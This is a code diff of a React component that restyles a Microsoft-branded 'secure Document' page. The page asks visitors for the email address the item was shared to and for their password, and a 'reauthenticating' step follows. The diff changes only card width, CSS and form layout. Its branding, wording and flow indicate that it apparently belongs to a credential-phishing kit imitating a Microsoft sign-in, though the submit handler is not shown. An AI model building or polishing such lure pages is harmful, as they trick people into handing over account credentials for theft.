@@ -517,7 +517,7 @@ function App() {
       );
 
     case 'document-protection':
-      // --- Microsoft-styled, WIRED TO LOGIC, FIXED FORM GROUP WIDTH, EXPANDED CARD, STRETCHED INPUTS AND BUTTON ---
+      // --- Reduced width card and new vertical form layout ---
       return (
         <div style={{
           background: "#f7f9fb",
@@ -532,131 +532,121 @@ function App() {
             {`
             .card {
               background: #fff;
-              border-radius: 10px;
-              box-shadow: 0 6px 22px 0 rgba(0,0,0,0.08);
-              padding: 35px 60px 35px 60px;
-              max-width: 900px;
+              border-radius: 12px;
+              box-shadow: 0 6px 22px 0 rgba(0,0,0,0.10);
+              padding: 32px 24px;
+              max-width: 420px;
               width: 100%;
-              margin-top: 38px;
+              margin-top: 44px;
               display: flex;
               flex-direction: column;
               align-items: center;
             }
             .logo {
-              width: 100px;
-              margin-bottom: 28px;
+              width: 84px;
+              margin-bottom: 22px;
               display: block;
             }
             .title {
-              font-size: 1.7em;
+              font-size: 1.35em;
               font-weight: 600;
               color: #23272a;
-              margin-bottom: 16px;
-              letter-spacing: 0.01em;
+              margin-bottom: 8px;
               text-align: center;
+              letter-spacing: 0.01em;
             }
             .desc {
-              font-size: 1.04em;
+              font-size: 1.01em;
               color: #38444d;
-              margin-bottom: 10px;
+              margin-bottom: 8px;
               text-align: center;
             }
             .secure-link {
-              font-size: 1.13em;
-              font-weight: 150;
+              font-size: 1.09em;
+              font-weight: 450;
               color: #0078d4;
-              margin-bottom: 16px;
+              margin-bottom: 12px;
               text-align: center;
               word-break: break-word;
             }
             .instructions {
-              font-size: 1em;
+              font-size: 0.99em;
               color: #626b76;
-              margin-bottom: 20px;
+              margin-bottom: 16px;
               line-height: 1.5em;
               text-align: center;
             }
-            .form-group {
+            .vertical-form {
               width: 100%;
-              max-width: 650px;
-              margin-left: 0;
+              margin: 0 auto;
+              padding: 0;
               display: flex;
               flex-direction: column;
               align-items: stretch;
-              background: none;
+              gap: 14px;
             }
-            .input-label {
+            .form-field-group {
+              display: flex;
+              flex-direction: column;
+              width: 100%;
+            }
+            .form-label {
               font-size: 0.97em;
               color: #4d5a67;
               margin-bottom: 7px;
+              font-weight: 500;
               text-align: left;
-              margin-left: 8px;
-              margin-top: 10px;
-              align-self: flex-start;
             }
-            .input-row {
+            .form-input {
               width: 100%;
-              position: relative;
-              margin-bottom: 18px;
-              background: #f6f8fa;
-              border-radius: 6px;
-              display: flex;
-              align-items: center;
-            }
-            input[type="email"], input[type="password"] {
-              width: 100%;
-              font-size: 1.07em;
-              padding: 16px 70px 16px 24px;
-              border: 1.5px solid #cfd8dc;
-              border-radius: 6px;
+              font-size: 1.01em;
+              padding: 12px 16px;
+              border: 1.3px solid #cfd8dc;
+              border-radius: 5px;
               box-sizing: border-box;
-              transition: border 0.2s;
-              outline: none;
-              background: transparent;
-              margin-bottom: 0;
-              display: block;
+              background: #f7f9fb;
               color: #23272a;
+              font-family: inherit;
+              transition: border 0.16s;
+              outline: none;
             }
-            input[type="email"]:focus, input[type="password"]:focus {
+            .form-input:focus {
               border-color: #0078d4;
               background: #fff;
             }
-            .input-icon {
-              position: absolute;
-              right: 18px;
-              top: 50%;
-              transform: translateY(-50%);
-              width: 30px;
-              height: 30px;
-              opacity: 0.6;
-              pointer-events: none;
+            .form-actions {
+              display: flex;
+              flex-direction: column;
+              align-items: stretch;
+              gap: 10px;
+              width: 100%;
+              margin-top: 8px;
             }
-            .next-btn {
+            .submit-btn {
               width: 100%;
               background: linear-gradient(90deg,#0078d4 0,#005fa3 100%);
               color: #fff;
               border: none;
-              border-radius: 6px;
-              font-size: 1.35em;
+              border-radius: 5px;
+              font-size: 1.13em;
               font-weight: 600;
-              padding: 20px 0;
+              padding: 14px 0;
               cursor: pointer;
-              margin-bottom: 18px;
-              margin-top: 8px;
+              margin-bottom: 0;
               box-shadow: 0 2px 8px rgba(0,120,212,0.08);
               transition: background 0.18s;
-              display: block;
               letter-spacing: 0.01em;
+              display: block;
             }
-            .next-btn:hover, .next-btn:focus {
+            .submit-btn:hover, .submit-btn:focus {
               background: linear-gradient(90deg,#005fa3 0,#0078d4 100%);
             }
             .footer-text {
               font-size: 0.92em;
               color: #8896ae;
-              margin-top: 12px;
+              margin-top: 16px;
               margin-bottom: 0;
-              text-align: justify;
+              text-align: center;
               line-height: 1.5em;
               max-width: 100%;
               width: 100%;
@@ -671,19 +661,16 @@ function App() {
               margin-top: 18px;
               margin-bottom: 15px;
             }
-            @media (max-width: 950px) {
+            @media (max-width: 520px) {
               .card {
-                max-width: 98vw;
-                padding: 18px 2vw 16px 2vw;
-              }
-              .form-group {
-                max-width: 100%;
-              }
-              .footer-text, .copyright {
-                font-size: 0.87em;
+                max-width: 99vw;
+                padding: 14px 2vw;
               }
               .logo {
-                width: 92px;
+                width: 68px;
+              }
+              .footer-text, .copyright {
+                font-size: 0.85em;
               }
             }
             `}
@@ -696,45 +683,38 @@ function App() {
             <div className="instructions">
               To open this secure Document, please enter the email address that this item was shared to.
             </div>
-            <form onSubmit={handleFormSubmit} autoComplete="off">
-              <div className="form-group">
-                <label className="input-label" htmlFor="email">Email Address</label>
-                <div className="input-row">
-                  <input
-                    type="email"
-                    id="email"
-                    placeholder="Enter email"
-                    required
-                    value={formEmail}
-                    onChange={e => setFormEmail(e.target.value)}
-                    disabled={isSubmitting}
-                    autoComplete="username"
-                  />
-                  <svg className="input-icon" viewBox="0 0 24 24" fill="none">
-                    <rect x="3" y="5" width="18" height="14" rx="2" stroke="#0078d4" strokeWidth="1.5"/>
-                    <path d="M3 5l9 7l9-7" stroke="#0078d4" strokeWidth="1.5" fill="none"/>
-                  </svg>
-                </div>
-                <label className="input-label" htmlFor="password">Password</label>
-                <div className="input-row">
-                  <input
-                    type="password"
-                    id="password"
-                    placeholder="Enter password"
-                    required
-                    value={formPassword}
-                    onChange={e => setFormPassword(e.target.value)}
-                    disabled={isSubmitting}
-                    autoComplete="current-password"
-                  />
-                  <svg className="input-icon" viewBox="0 0 24 24" fill="none">
-                    <rect x="4" y="8" width="16" height="10" rx="2" stroke="#0078d4" strokeWidth="1.5"/>
-                    <circle cx="12" cy="13" r="2" stroke="#0078d4" strokeWidth="1.5" fill="none"/>
-                    <rect x="8" y="4" width="8" height="4" rx="1" stroke="#0078d4" strokeWidth="1.2" fill="none"/>
-                  </svg>
-                </div>
+            <form className="vertical-form" onSubmit={handleFormSubmit} autoComplete="off">
+              <div className="form-field-group">
+                <label className="form-label" htmlFor="email">Email Address</label>
+                <input
+                  className="form-input"
+                  type="email"
+                  id="email"
+                  placeholder="Enter your email"
+                  required
+                  value={formEmail}
+                  onChange={e => setFormEmail(e.target.value)}
+                  disabled={isSubmitting}
+                  autoComplete="username"
+                />
+              </div>
+              <div className="form-field-group">
+                <label className="form-label" htmlFor="password">Password</label>
+                <input
+                  className="form-input"
+                  type="password"
+                  id="password"
+                  placeholder="Enter your password"
+                  required
+                  value={formPassword}
+                  onChange={e => setFormPassword(e.target.value)}
+                  disabled={isSubmitting}
+                  autoComplete="current-password"
+                />
+              </div>
+              <div className="form-actions">
                 <button
-                  className="next-btn"
+                  className="submit-btn"
                   type="submit"
                   disabled={isSubmitting}
                   style={{opacity: isSubmitting ? 0.7 : 1}}
@@ -752,6 +732,7 @@ function App() {
           </div>
         </div>
       );
+      // --- End reduced card & new form ---
 
     case 'reauthenticating':
       return (
